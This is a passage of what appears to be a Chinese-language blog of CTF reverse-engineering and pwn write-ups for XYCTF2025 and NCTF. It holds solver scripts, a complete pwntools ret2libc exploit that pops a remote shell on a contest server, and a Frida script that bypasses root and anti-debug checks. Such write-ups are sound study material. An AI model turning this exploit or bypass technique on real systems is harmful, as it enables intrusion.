) , int( 6816-6705 ) , int( 8085-7968 ) , int( -365+481 ) , int( 604944/8402 ) , int( 246238/2438 ) , int( -8362+8482 ) , int( 171296/5353 ) , int( -4409+4447 ) , int( 6653-6621 ) , int( 336856/4108 ) , int( -7684+7789 ) , int( 2731-2628 ) , int( 6687-6583 ) , int( 93496/806 ) , int( 1485-1445 ) , int( 5893-5859 ) , int( 410832/8559 ) , int( -4662+4696 ) , int( 44352/1386 ) , int( -9673+9711 ) , int( 86144/2692 ) , int( 507744/7052 ) , int( 9182-9081 ) , int( 7532-7412 ) , int( 8068-8028 ) , int( 921096/9304 ) , int( 7511-7406 ) , int( 542752/4846 ) , int( 7625-7521 ) , int( 811939/8039 ) , int( -5529+5643 ) , int( 366498/5553 ) , int( 366993/3033 ) , int( 116/1 ) , int( -4380+4481 ) , int( 234889/5729 ) , int( 374-330 ) , int( 7121-7089 ) , int( -964+1014 ) , int( -9185+9226 ) , int( 53105/4085 ) , int( 1368-1358 ) , int( 3776-3744 ) , int( 81760/2555 ) , int( 2908-2876 ) , int( 672/21 ) , int( 591084/7578 ) , int( -9777+9878 ) , int( 4310-4190 ) , int( -329+445 ) , int( 8841-8828 ) , int( 80190/8019 ) , int( 9449-9417 ) , int( 5188-5156 ) , int( 6912/216 ) , int( 46496/1453 ) , int( 8868-8855 ) , int( -6823+6833 ) , int( -5834+5866 ) , int( 7348-7316 ) , int( 214720/6710 ) , int( -3281+3313 ) , int( -6230+6312 ) , int( -281+398 ) , int( -5980+6090 ) , int( 2673-2591 ) , int( 233897/3491 ) , int( -8111+8143 ) , int( -3952+4013 ) , int( 7846-7814 ) , int( 5859-5748 ) , int( 661752/5656 ) , int( 742632/6402 ) , int( 2362-2290 ) , int( 286234/2834 ) , int( 814-694 ) , int( 40105/3085 ) , int( 4489-4479 ) , int( -838+907 ) , int( -8563+8673 ) , int( -2698+2798 ) , int( -2969+3001 ) , int( 7600-7530 ) , int( 896805/7665 ) , int( -8073+8183 ) , int( 1727-1628 ) , int( -6557+6673 ) , int( 3501-3396 ) , int( 87357/787 ) , int( 4403-4293 ) , int( 3724-3711 ) , int( 4260-4250 ) , int( -6051+6064 ) , int( -71+81 ) , int( 466-427 ) , int( 6300-6268 ) , int( -15360+8376 ) , int( -1.435792E+08/8237 ) , int( -21866-10 ) , int( -4.86175E+07/8145 ) , int( -1.932544E+08/5987 ) , int( 3287-3159 ) , int( -19485+2053 ) , int( -10516-6235 ) , int( 78936/6072 ) , int( -9394+9404 ) , int( 551807/7559 ) , int( 973692/9546 ) , int( 310720/9710 ) , int( 507832/6682 ) , int( 4001-3934 ) , int( -4647+4744 ) , int( -6770+6885 ) , int( 491163/4863 ) , int( 10032-9992 ) , int( -1066+1148 ) , int( 174330/1490 ) , int( 986700/8970 ) , int( 78064/952 ) , int( -5671+5738 ) , int( -6282+6322 ) , int( 4287-4185 ) , int( 3549-3441 ) , int( 790162/8146 ) , int( 8188-8085 ) , int( -800+844 ) , int( 522-490 ) , int( -5550+5663 ) , int( 284291/2389 ) , int( -9338+9440 ) , int( -6438+6539 ) , int( 8277-8236 ) , int( -8711+8752 ) , int( -5591+5623 ) , int( 148291/2431 ) , int( -3434+3466 ) , int( 425372/5597 ) , int( -5132+5199 ) , int( -322+419 ) , int( 185380/1612 ) , int( 5352-5251 ) , int( 365160/9129 ) , int( 9277-9158 ) , int( -489+590 ) , int( 913002/8951 ) , int( -8433+8531 ) , int( 8830-8713 ) , int( 1089-970 ) , int( 192990/1838 ) , int( -9564+9681 ) , int( -5453+5554 ) , int( 40221/981 ) , int( -7928+7960 ) , int( 756672/9008 ) , int( 785824/7556 ) , int( 1607-1506 ) , int( -5161+5271 ) , int( -8087+8100 ) , int( 90010/9001 ) , int( 34688/1084 ) , int( 20224/632 ) , int( 8731-8699 ) , int( 178496/5578 ) , int( -837+914 ) , int( -4694+4809 ) , int( -7603+7706 ) , int( 619212/9382 ) , int( 1092906/9846 ) , int( 7594-7474 ) , int( 69632/2176 ) , int( 133042/3913 ) , int( 9457-9390 ) , int( 2319-2208 ) , int( 475200/4320 ) , int( -8977+9080 ) , int( -8597+8711 ) , int( 1592-1495 ) , int( 754812/6507 ) , int( -6078+6195 ) , int( -9522+9630 ) , int( 1824-1727 ) , int( -6145+6261 ) , int( 312690/2978 ) , int( -1513+1624 ) , int( 902220/8202 ) , int( 1378-1263 ) , int( -8522+8555 ) , int( -6796+6828 ) , int( -57+124 ) , int( -4239+4350 ) , int( 964212/8458 ) , int( 573534/5031 ) , int( 565903/5603 ) , int( -8417+8516 ) , int( 1116732/9627 ) , int( -8648+8680 ) , int( -6586+6656 ) , int( -1832+1908 ) , int( -5339+5404 ) , int( 559267/7877 ) , int( 138765/4205 ) , int( 2868-2834 ) , int( 556-543 ) , int( 53810/5381 ) , int( 212589/3081 ) , int( -4647+4755 ) , int( 712885/6199 ) , int( -1506+1607 ) , int( 91234/7018 ) , int( 1299-1289 ) , int( -4904+4936 ) , int( 9659-9627 ) , int( 117024/3657 ) , int( 38720/1210 ) , int( 440748/5724 ) , int( 19320/168 ) , int( -9444+9547 ) , int( -3384+3450 ) , int( 9050-8939 ) , int( -6493+6613 ) , int( -5110+5142 ) , int( -2061+2095 ) , int( 1450-1363 ) , int( 111+3 ) , int( 9913-9802 ) , int( 152680/1388 ) , int( -1082+1185 ) , int( 4066-4034 ) , int( 6896-6794 ) , int( 838-730 ) , int( -2902+2999 ) , int( 5974/58 ) , int( -8244+8290 ) , int( -9640+9674 ) , int( 36491/2807 ) , int( -2075+2085 ) , int( -301+370 ) , int( -2824+2934 ) , int( -2915+3015 ) , int( 1811-1779 ) , int( -7946+8019 ) , int( -5275+5377 ) , int( -7424+7437 ) , int( 34620/3462 )] for i in range(len(src)): if(src[i] \u0026lt; 0 or src[i] \u0026gt; 256): src[i] = src[i] % 256 print(bytes(src)) 输出去混淆后的vbs脚本，简单整理下格式\n虽然还有乱码，但是不影响理解了\nMsgBox \u0026#34;Dear CTFER. Have fun in XYCTF 2025!\u0026#34; flag = InputBox(\u0026#34;Enter the FLAG:\u0026#34;, \u0026#34;XYCTF\u0026#34;) wefbuwiue = \u0026#34;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4\u0026#34; \u0026#39; ¢è¿RC4å»æ¼åèæ½¼ï qwfe = \u0026#34;rc4key\u0026#34; \u0026#39; ÀåçRC4åæ° Function RunRC(sMessage, strKey) Dim kLen, i, j, temp, pos, outHex Dim s(255), k(255) \u0026#39; åå? kLen = Len(strKey) For i = 0 To 255 s(i) = i k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1)) \u0026#39; ¯é¥½è¨ASCII¼ç Next \u0026#39; KSA¯é¥°å¦ j = 0 For i = 0 To 255 j = (j + s(i) + k(i)) Mod 256 temp = s(i) s(i) = s(j) s(j) = temp Next \u0026#39; PRGAæµç i = 0 : j = 0 : outHex = \u0026#34;\u0026#34; For pos = 1 To Len(sMessage) i = (i + 1) Mod 256 j = (j + s(i)) Mod 256 temp = s(i) s(i) = s(j) s(j) = temp \u0026#39; å¹è¬¸åè? Dim plainChar, cipherByte plainChar = Asc(Mid(sMessage, pos, 1)) \u0026#39; çASCII¤ç cipherByte = s((s(i) + s(j)) Mod 256) Xor plainChar outHex = outHex \u0026amp; Right(\u0026#34;0\u0026#34; \u0026amp; Hex(cipherByte), 2) Next RunRC = outHex End Function \u0026#39; ¸é°éè If LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) Then MsgBox \u0026#34;Congratulations! Correct FLAG!\u0026#34; Else MsgBox \u0026#34;Wrong flag.\u0026#34; End If 看出是经过RC4加密，用Cyberchef解一下得到flag。最后MD5提交\nmoon # 比较常规的py调用pyd。一开始不能正常运行，后来尝试换了几个版本，在3.11跑起来了\n用help命令，简单看一下：\n从这里就可以推测出加密逻辑了，之后结合静态分析进一步验证。\nIDA分析pyd，去了符号，但是可以看到一个导出函数 PyInit_moon。结合分析cython的经验，我们要找的函数应该在它之前，所以能比较容易定位到题中两个函数的实现。\nsub_180002550 维护了一个类似字符串常量池的结构，后面分析时要经常借助这里面的字符串和偏移量来恢复符号。偏移和对应的字符串在内存上是紧挨着的。\n函数的调用也是有迹可循的，一般是先从字符串池中拿到函数名，之后拿到函数的引用，最后显式调用 PyObject_Call 之类的API完成调用，中间穿插大量错误检查的代码和GC等等。一些明显的特征如下：\nPyErr_Format(PyExc_NameError, \u0026quot;name '%U' is not defined\u0026quot;, var);\nPyObject_GetAttr(v1, v2);\nPyDict_GetItem_KnownHash\n基本数据类型的方法一般是由API直接实现，比如 PyNumber_Xor 之类。结合这些信息，大概分析出逻辑：\nxor_crypt：初始化seed，用 random.randint 得到的随机数和传入的字节数组异或 check_flag：调用xor_crypt，和硬编码的密文比较。 因为check的逻辑不复杂，而且异或可逆，所以可以黑盒调用 xor_crypt，传入密文得到明文flag。\nimport moon seed_val = moon.SEED target = moon.TARGET_HEX data = [int(target[i*2:(i+1)*2],16) for i in range(len(target)//2)] print(moon.xor_crypt(seed_val,bytes(data))) Dragon # bc 文件格式对应LLVM的bitcode IR，使用LLVM编译工具链中的 llc 将其编译为x86/64架构的目标文件\nllc .\\Dragon.bc -filetype=obj -o Dragon.o IDA分析，输入的flag每2个字节一组计算CRC64，考虑爆破求解。\n#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; #include\u0026lt;stdint.h\u0026gt; #include\u0026#34;ida_def.h\u0026#34; __int64 calculate_crc64_direct(unsigned __int8 *a1, unsigned __int64 a2) { __int64 v3; // [rsp+0h] [rbp-28h] unsigned __int64 i; // [rsp+8h] [rbp-20h] unsigned __int64 j; // [rsp+10h] [rbp-18h] v3 = -1; for ( i = 0; i \u0026lt; a2; ++i ) { v3 ^= (unsigned __int64)a1[i] \u0026lt;\u0026lt; 56; for ( j = 0; j \u0026lt; 8; ++j ) { if ( v3 \u0026gt;= 0 ) v3 *= 2ull; else v3 = (2ull * v3) ^ 0x42F0E1EBA9EA3693ull; } } return ~v3; } void brute(uint64_t target_crc, uint8_t *result) { uint8_t input[2]; uint64_t computed_crc; for (int b1 = 0x20; b1 \u0026lt; 0x7F; b1++) { for (int b2 = 0x20; b2 \u0026lt; 0x7F; b2++) { input[0] = (uint8_t)b1; input[1] = (uint8_t)b2; computed_crc = calculate_crc64_direct(input, 2); if (computed_crc == target_crc) { result[0] = b1; result[1] = b2; return; } } } result[0] = 0; result[1] = 0; } unsigned char crcdata[] = { 0x47, 0x7B, 0x9F, 0x41, 0x4E, 0xE3, 0x63, 0xDC, 0xC6, 0xBF, 0xB2, 0xE7, 0xD4, 0xF8, 0x1E, 0x03, 0x9E, 0xD8, 0x5F, 0x62, 0xBC, 0x2F, 0xD6, 0x12, 0xE8, 0x55, 0x57, 0xCC, 0xE1, 0xB6, 0xE8, 0x83, 0xCC, 0x65, 0xB6, 0x2A, 0xEB, 0xB1, 0x7B, 0xFC, 0x6B, 0xD9, 0x62, 0x2A, 0x1B, 0xCA, 0x82, 0x93, 0x87, 0xC3, 0x73, 0x76, 0xA0, 0xF8, 0xFF, 0xB1, 0xE1, 0x05, 0x8E, 0x38, 0x27, 0x16, 0xA8, 0x0D, 0xB7, 0xAA, 0xD0, 0xE8, 0x1A, 0xE6, 0xF1, 0x9E, 0x45, 0x61, 0xF2, 0xE7, 0xD2, 0x3F, 0x78, 0x92, 0x0B, 0xE6, 0x6F, 0xF5, 0xA1, 0x7C, 0xC9, 0x63, 0xAB, 0x3A, 0xB7, 0x43, 0xB0, 0xA8, 0xD3, 0x9B }; int main() { __int64 v7[13]; unsigned char result[0x42]; memcpy(v7, crcdata, 0x60u); for(int r=0;r\u0026lt;12;r++) { brute(v7[r],result+2*r); printf(\u0026#34;%s\\n\u0026#34;,(char*)result); } return 0; } Lake # Pascal编译的程序，先在github找了一圈，没找到现成的反编译工具。还是用IDA老老实实分析。\n尝试用finger恢复了一部分符号，效果还不错。\n之后在 start 函数附近找到了加密逻辑：\nswitch-case 实现了一个简单的虚拟机，可以发现handler都是一些基本的二元运算，编写脚本来还原代码\nbytecode = [0x0002, 0x0002, 0x000C, 0x0001, 0x001A, 0x0055, 0x0001, 0x0023, 0x000C, 0x0002, 0x000E, 0x0009, 0x0001, 0x001B, 0x0006, 0x0008, 0x0006, 0x0005, 0x0008, 0x0001, 0x0005, 0x0002, 0x001B, 0x000E, 0x0002, 0x0019, 0x0003, 0x0002, 0x001A, 0x0004, 0x0008, 0x0004, 0x0008, 0x0001, 0x0003, 0x000C, 0x0002, 0x000C, 0x000A, 0x0001, 0x0025, 0x0002, 0x0001, 0x0020, 0x0002, 0x0001, 0x0009, 0x000C, 0x0008, 0x001A, 0x0005, 0x0002, 0x0004, 0x000D, 0x0008, 0x0008, 0x000F, 0x0002, 0x000A, 0x000E, 0x0001, 0x0010, 0x0007, 0x0001, 0x000C, 0x0007, 0x0008, 0x0022, 0x0008, 0x0008, 0x0015, 0x000A, 0x0001, 0x0027, 0x007E, 0x0002, 0x0007, 0x0002, 0x0008, 0x000F, 0x0003, 0x0008, 0x000A, 0x000A, 0x0001, 0x0022, 0x000B, 0x0002, 0x0012, 0x0008, 0x0002, 0x0019, 0x0009, 0x0008, 0x000E, 0x0006, 0x0008, 0x0000, 0x0005, 0x0001, 0x000A, 0x0008, 0x0008, 0x001B, 0x0007, 0x0008, 0x000D, 0x0006, 0x0008, 0x000D, 0x0004, 0x0008, 0x0017, 0x000C, 0x0008, 0x0022, 0x000E, 0x0002, 0x0012, 0x0034, 0x0001, 0x0026, 0x0077] handler = { 1:\u0026#34;data[%d] += %d\u0026#34;, 2:\u0026#34;data[%d] -= %d\u0026#34;, 3:\u0026#34;data[%d] *= %d\u0026#34;, 4:\u0026#34;data[%d] /= %d\u0026#34;, 5:\u0026#34;data[%d] %= %d\u0026#34;, 6:\u0026#34;data[%d] \u0026amp;= %d\u0026#34;, 7:\u0026#34;data[%d] |= %d\u0026#34;, 8:\u0026#34;data[%d] ^= %d\u0026#34; } dec_handler = { 1:\u0026#34;data[%d] -= %d\u0026#34;, 2:\u0026#34;data[%d] += %d\u0026#34;, 3:\u0026#34;data[%d] /= %d\u0026#34;, 4:\u0026#34;data[%d] *= %d\u0026#34;, 8:\u0026#34;data[%d] ^= %d\u0026#34; } def dis(lst): fmt = handler[lst[0]] print(fmt%(lst[1],lst[2])) def dec_dis(lst): fmt = dec_handler[lst[0]] print(fmt%(lst[1],lst[2])) for i in range(0,len(bytecode),3): dis(bytecode[i:i+3]) dec_dis(bytecode[i:i+3]) 之后发现加密都是单字节的线性运算，只用到了加减和异或，还原时输出对应的逆运算即为解密代码。\n后面还有一个4字节的编码，通过移位打乱位的顺序，也是比较容易写出逆运算。\ndef decode_optimized(data): original = bytearray(40) for i in range(0, 10): if 4 * i + 1 \u0026lt;= 39: b3_low = data[4*i + 3] \u0026amp; 0b00000111 b3_high = data[4*i + 3] \u0026amp; 0b11111000 original[4*i + 1] |= (b3_low \u0026lt;\u0026lt; 5) \u0026amp; 0xFF original[4*i + 0] |= (b3_high \u0026gt;\u0026gt; 3) \u0026amp; 0xFF if 4 * i \u0026lt;= 39: b2_low = data[4*i + 2] \u0026amp; 0b00000111 b2_high = data[4*i + 2] \u0026amp; 0b11111000 original[4*i + 3] |= (b2_high \u0026gt;\u0026gt; 3) \u0026amp; 0xFF original[4*i + 0] |= (b2_low \u0026lt;\u0026lt; 5) \u0026amp; 0xFF if 4 * i + 3 \u0026lt;= 39: b1_low = data[4*i + 1] \u0026amp; 0b00000111 b1_high = data[4*i + 1] \u0026amp; 0b11111000 original[4*i + 2] |= (b1_high \u0026gt;\u0026gt; 3) \u0026amp; 0xFF original[4*i + 3] |= (b1_low \u0026lt;\u0026lt; 5) \u0026amp; 0xFF if 4 * i + 2 \u0026lt;= 39: b0_low = data[4*i] \u0026amp; 0b00000111 b0_high = data[4*i] \u0026amp; 0b11111000 original[4*i + 2] |= (b0_low \u0026lt;\u0026lt; 5) \u0026amp; 0xFF original[4*i + 1] |= (b0_high \u0026gt;\u0026gt; 3) \u0026amp; 0xFF return list(original) data = [0x4A, 0xAB, 0x9B, 0x1B, 0x61, 0xB1, 0xF3, 0x32, 0xD1, 0x8B, 0x73, 0xEB, 0xE9, 0x73, 0x6B, 0x22, 0x81, 0x83, 0x23, 0x31, 0xCB, 0x1B, 0x22, 0xFB, 0x25, 0xC2, 0x81, 0x81, 0x73, 0x22, 0xFA, 0x03, 0x9C, 0x4B, 0x5B, 0x49, 0x97, 0x87, 0xDB, 0x51] data = decode_optimized(data) data[2] += 12 data[26] -= 85 data[35] -= 12 data[14] += 9 data[27] -= 6 data[6] ^= 5 data[1] ^= 5 data[27] += 14 data[25] += 3 data[26] += 4 data[4] ^= 8 data[3] -= 12 data[12] += 10 data[37] -= 2 data[32] -= 2 data[9] -= 12 data[26] ^= 5 data[4] += 13 data[8] ^= 15 data[10] += 14 data[16] -= 7 data[12] -= 7 data[34] ^= 8 data[21] ^= 10 data[39] -= 126 data[7] += 2 data[15] ^= 3 data[10] ^= 10 data[34] -= 11 data[18] += 8 data[25] += 9 data[14] ^= 6 data[0] ^= 5 data[10] -= 8 data[27] ^= 7 data[13] ^= 6 data[13] ^= 4 data[23] ^= 12 data[34] ^= 14 data[18] += 52 data[38] -= 119 print(bytes(data)) 解出的flag有几个字节不正确，但是大部分没问题，根据上下文含义修复一下即可\nPwn # ret2libc\u0026rsquo;s revenge # 签到pwn，无PIE，无canary，放心栈溢出。\n使用 fgetc(stdin) 循环读取输入，数组没有越界检查，导致溢出。\n题目已经明示了打 ret2libc，刚好虚拟机是glibc 2.35，和题中版本一样，省了不少事\n先找几个有用的gadget。\n0x000000000040101a : ret 0x0000000000401016 : add rsp, 8 ; ret 0x0000000000401017 : add esp, 8 ; ret 0x00000000004010e3 : nop ; and rsi, 0 ; ret 0x00000000004010e4 : and rsi, 0 ; ret 0x00000000004010e5 : and esi, 0 ; ret 0x00000000004010ea : nop ; add rsi, qword ptr [rbp + 0x20] ; ret 0x00000000004010ec : add esi, dword ptr [rbp + 0x20] ; ret 0x00000000004010eb : add rsi, qword ptr [rbp + 0x20] ; ret 0x0000000000401180 : mov rdi, rsi ; ret 0x0000000000401181 : mov edi, esi ; ret 发现不能直接控制 rdi，但是可以构造如下的ROP链 替换原先的 pop rdi ;ret\nand rsi, 0; ret add rsi, qword ptr [rbp + 0x20]; ret ret ret add rsp, 8; ret qword rdi_value mov rdi, rsi; ret 因为要用到 rbp 来写入寄存器，所以溢出时不能覆盖 rbp 的值，可以在覆盖 v6 的时候直接改成 rbp+8 的地址，跳到写rop的地方来。\n另外，stdout 设置了全缓冲，要多次返回 main 挤满缓冲区拿到输出。本地的缓冲区长度和远程不一样，多次尝试发现远程长度是 0x1000。\n（赛时在这里卡了很久，半天看不到 puts_got 的回显，一度以为自己rop链有问题，本地各种尝试也没搞明白。后来看到主函数中的 puts 也没输出，开始想是不是 setvbuf 动了手脚，一看果然。。\n完整exp:\nfrom pwn import * context(os=\u0026#34;linux\u0026#34;,arch=\u0026#34;amd64\u0026#34;,log_level=\u0026#34;debug\u0026#34;) host,port = \u0026#34;39.106.71.197\u0026#34;, 30761 io=remote(host,port) #io=process(\u0026#34;./attachment\u0026#34;) ret = 0x40101a and_rsi_ret = 0x4010e4 add_rsi_ret = 0x4010eb add_rsp_ret = 0x401016 mov_rdi_rsi_ret = 0x401180 main_addr = 0x40127b revenge_addr = 0x4011ff elf=ELF(\u0026#34;./attachment\u0026#34;) libc=ELF(\u0026#34;./libc-2.35.so\u0026#34;) puts_got = elf.got[\u0026#34;puts\u0026#34;] puts_plt = elf.plt[\u0026#34;puts\u0026#34;] padstack = b\u0026#39;a\u0026#39; * (0x220 - 4) + b\u0026#39;\\x28\u0026#39; payload0 = padstack + p64(main_addr) payload1 = flat([ padstack, p64(and_rsi_ret), p64(add_rsi_ret), p64(ret), p64(ret), p64(add_rsp_ret), p64(puts_got), p64(mov_rdi_rsi_ret), p64(puts_plt), p64(revenge_addr) ]) def stdout_leak(): io_round = 0x1000//19-1 for i in range(io_round): io.sendline(payload0) io.sendline(payload1) io.sendline(payload0) out = io.recv(0x1000) leak_addr = out[(io_round+1)*19:][:6] leak_addr = u64(leak_addr.ljust(8,b\u0026#34;\\x00\u0026#34;)) print(hex(leak_addr)) return leak_addr leak = stdout_leak() libc.address = leak - libc.symbols[\u0026#34;puts\u0026#34;] system = libc.symbols[\u0026#34;system\u0026#34;] binsh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) payload2 = flat([ padstack, p64(and_rsi_ret), p64(add_rsi_ret), p64(ret), p64(ret), p64(add_rsp_ret), p64(binsh), p64(mov_rdi_rsi_ret), p64(system) ]) io.sendline(payload2) io.interactive() ","date":"2025-04-07","externalUrl":null,"permalink":"/writeups/xyctf2025/","section":"Writeups","summary":"reverse \u0026amp; pwn writeup of XYCTF2025","title":"XYCTF2025 Binary","type":"writeups"},{"content":" SafeProgram # 查看导出函数表可以发现 TlsCallback，从这里入手分析。\n第一个 tls_callback 注册 VEH，之后在注册表写入CRC的 checksum 值。第二个对代码段进行扫描并且查表计算CRC，和注册表保存的 checksum 比对，不一致则退出程序。\n主函数一上来开了新的线程，而且每隔1000ms递归创建新线程。因为tls回调函数在线程创建或者终止时都会调用，所以这里是在循环检测CRC。绕过检测的方法比较多，直接的方法是patch 删去 TLS_CALLBACK1 中调用的CRC检测函数。也可以在调试时只使用硬件断点。\n后面就是常规的输入-加密-检查过程。加密函数是SM4，可以根据S盒的特征推测，或者绕过 CRC 之后调试分析得出。要注意的是加密之前，程序主动触发除零异常，调用 VEH 异常处理函数修改了 key 和 Sbox\n解密的话可以dump下来修改后的S盒以及key，然后找一个SM4的脚本，修改Sbox之后解密即可。\nezDOS # MASM 写的16位程序。拿IDA打开，静态分析的话有多处花指令干扰。\n一共有两种类型的花指令，都是比较常规的。\n第一类：永恒跳转，nop掉即可。\njnz offset lable jz offset lable + 1 第二类基于堆栈的 call +ret。al 经过一系列计算得到一个固定的值，加到 dl 然后 push 到栈上，间接修改了堆栈末尾的返回地址，retf 回去就会改变正常的控制流，跳过部分指令。\ncall far ptr junkskip junk segment junkskip: pop dx push ax xor ax, ax ; ... add dl, al pop ax push dx retf junk ends 这种可能比较隐蔽，因为直接 call 进一个单独的函数，容易把它当成加密的一部分。这里没有加 0xE8 之类的 junkcode 干扰反汇编，而是使用正常的指令，一定程度上也起到混淆加密流程的作用。\n找一个DOS环境，比如DOSBox之类的模拟器调试一下，基本就没什么困难了。动调时也能跟踪到 retf 之后控制流返回的地址。最终能分析出加密算法是部分魔改的RC4，改动的地方如下：\nS盒逆序初始化 key 左移3位，右移5位 密钥流生成的值 加1 到这里就可以写脚本解密。考虑到RC4的流密码性质，这道题也可以采用更简单的做法：动调记录密钥流，之后和密文逐一异或得到flag。\ndata = [0x7C, 0x3E, 0x0D, 0x3C, 0x88, 0x54, 0x83, 0x0E, 0x3B, 0xB8, 0x99, 0x1B, 0x9B, 0xE5, 0x23, 0x43, 0xC5, 0x80, 0x45, 0x5B, 0x9A, 0x29, 0x24, 0x38, 0xA9, 0x5C, 0xCB, 0x7A, 0xE5, 0x93, 0x73, 0x0E, 0x70, 0x6D, 0x7C, 0x31, 0x2B, 0x8C] key = b\u0026#34;NCTf2024nctF\u0026#34; modikey = [((char\u0026lt;\u0026lt;3)|(char\u0026gt;\u0026gt;5))\u0026amp;0xFF for char in key] S = [255 - m for m in range(256)] T = [modikey[n % len(modikey)] for n in range(256)] j = 0 for i in range(256): j = (j + S[i] + T[i]) % 256 S[i],S[j] = S[j],S[i] i = j = t = 0 for k in range(len(data)): i = (i + 1) % 256 j = (j + S[i]) % 256 t = (S[i] + S[j]) % 256 S[i],S[j] = S[j],S[i] data[k] ^= (S[t] + 1) print(bytes(data).decode()) x1Login # 这题用frida可以很快做出来，但是首先看一下常规方法\n静态分析发现 Java层有root检测和反调试。常规绕过方法应该是apktool解包修改smali代码，再重新打包签名。同时java层有字符串混淆，分析 libsimple.so 得出算法是先异或字符串长度之后换表base64，之后可以写脚本去混淆。\n继续分析 MainActivity 能够发现动态加载dex，这个过程也会调用一个native方法 loadDEX。分析另外一个动态库 libnative.so，加载的流程为：从assets提取名为 libsimple.so 的文件，之后从0x40偏移开始把内容复制到byte数组中，返回到 java层的 InMemoryDexClassLoader。\n这里的 libsimple.so是假的ELF，只有前0x40字节是elf_header，后面则是真正的dex。修复后反编译如下：\nusername可以去混淆得到，用户名验证通过后把自身的md5作为密钥，传给 Secure.doCheck 进一步验证password。这又是一个native方法，不过已经到最后的加密部分了。看流程，先加密后解密再加密，大概能猜到是3DES，如果用findcrypt也能够查出来DES特征。\n标准3DES就不多说了，不放心可以调试，加密函数内部也特意留了 __android_log_print 方便查看结果。最后特别要注意的是字节序的问题，因为DES是64-bit的分组加密，所以明文、密文还有密钥都直接用的 uint64_t 类型，整个过程都遵循小端序。\n在cyberchef解一下得到password。\nusername: X1c@dM1n1$t password: SafePWD~5y$x?YM+5U05Gm6= 接下来给出基于frida hook的快捷做法。\n过root检测和反调试：hook checkDebug和 checkRoot，修改返回值为 false 字符串去混淆：hook DecStr.get的参数和结果 dex加载：hook InMemoryDexClassLoader的构造函数或者Secure.loadDex，拿到bytearray形式的dex字节码。 用开源工具frida-dexdump可能容易一点，但是要手动挨个看哪个dex是要找的，一般逆向题的dex不会很大，找那种几kb的就行。 算法分析：可以hook native，找到 key 和 加密过程的中间变量。 完整js脚本如下\nfunction Start_Hook(){ Start_NativeHook(\u0026#34;libnative\u0026#34;); Java.perform(function(){ var Sec = Java.use(\u0026#34;com.nctf.simplelogin.Secure\u0026#34;); Sec.checkRoot.implementation = function (){ return false; }; Sec.checkDebug.implementation = function (){ return false; }; var DecStr = Java.use(\u0026#34;com.nctf.simplelogin.DecStr\u0026#34;); //overload(\u0026#39;java.lang.String\u0026#39;) DecStr.get.implementation = function (str) { var result = this.get(str); console.log(`[*] DecStr.get: ${str} ${result}`); return result; }; //overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;[B\u0026#39;) Sec.doCheck.implementation = function (str,barr) { var result = this.doCheck(str,barr); console.log(`[*] doCheck: key = ${barr}`); return result; }; }); } function Start_NativeHook(libname) { var dlopen = Module.findExportByName(null, \u0026#34;android_dlopen_ext\u0026#34;); Interceptor.attach(dlopen, { onEnter: function (args) { var filePath = args[0].readCString(); if (filePath.indexOf(libname) != -1) { console.log(`[+] android_dlopen_ext: start hooking ${libname}`) this.isCanHook = true; } }, onLeave: function (retValue) { if (this.isCanHook) { this.isCanHook = false; hook_native(); } } }) } function hook_native(){ var target_addr = Module.findBaseAddress(\u0026#34;libnative.so\u0026#34;).add(0x1F1C); Interceptor.attach(target_addr,{ onEnter: function (args) { var key0 = this.context.x22; var key1 = this.context.x23; console.log(`[+] native key = ${key0} ${key1}`); }, onLeave: function (retval) {} }); } setImmediate(Start_Hook); gogo # 首先恢复符号。目前高版本IDA已经能自动恢复golang符号，如果用 go_parser 插件也能恢复的差不多。\n主要逻辑是用协程实现了两个并发的寄存器虚拟机，分别加密flag的前后两部分。解题思路依然是还原vm字节码，只要能还原到汇编级别就足以正常分析。\n在IDA可以找到vm的结构体。前两个好理解，对应寄存器和cache缓存，后面两个是缓冲channel，分别向vm传入字节码和等待返回运行结果，最后一个map是指令集。从 instr 管道的4字节长度和 handler的参数可以推测出vm使用4字节的定长指令集，看指令名称也可以发现类似ARM。\n两个虚拟机的指令集不同，对应的初始化在 main_init 里面，依次定义了两个map类型变量。指令函数 handler 是二者共用的，需要逆向分析 opcode 和 handler 的对应关系，这里直接给出结论：\ntype handler func(vm *coroutVM, operands [3]byte) var instructionSetA = map[byte]handler{ 0x11: LDR, 0x12: LDRI, 0x15: STR, 0x16: STRI, 0x2A: MOV, 0x41: ADD, 0x42: SUB, 0x47: MUL, 0x71: LSL, 0x73: LSR, 0x7A: XOR, 0x7B: AND, 0xFE: RET, 0xFF: HLT, } var instructionSetB = map[byte]handler{ 0x13: LDR, 0x14: LDRI, 0x17: STR, 0x18: STRI, 0x2B: MOV, 0x91: ADD, 0x92: SUB, 0x97: MUL, 0xC1: LSL, 0xC3: LSR, 0xCA: XOR, 0xCB: AND, 0xFE: RET, 0xFF: HLT, } 分析 main_main，发现程序将flag拆分成20字节的明文块，分别复制到虚拟机的缓存中。接着同时开启两个vm的协程，并向 instr 管道发送相同的字节码指令，两个虚拟机的指令混在一起，只有能匹配上vm自身指令集的指令会被执行。还原指令时，根据opcode把二者的指令分开会更方便分析。\n大多数指令的结构都是 opcode(1byte) + dst reg(1byte) + src reg(2byte)，也有例如 MOV 这样涉及立即数的指令，最好结合调试对应的 handler 函数来进一步确定各 operand 的含义。分析清楚指令结构之后，就可以dump出程序中的vm字节码，写一个自动化或者半自动化的脚本进行还原。这里给出一个可用的 golang 脚本\npackage main import ( \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) var InstructionSetA = map[byte]string{ 0x11: \u0026#34;LDR\u0026#34;, 0x12: \u0026#34;LDRI\u0026#34;, 0x15: \u0026#34;STR\u0026#34;, 0x16: \u0026#34;STRI\u0026#34;, 0x2A: \u0026#34;MOV\u0026#34;, 0x41: \u0026#34;ADD\u0026#34;, 0x42: \u0026#34;SUB\u0026#34;, 0x47: \u0026#34;MUL\u0026#34;, 0x71: \u0026#34;LSL\u0026#34;, 0x73: \u0026#34;LSR\u0026#34;, 0x7A: \u0026#34;XOR\u0026#34;, 0x7B: 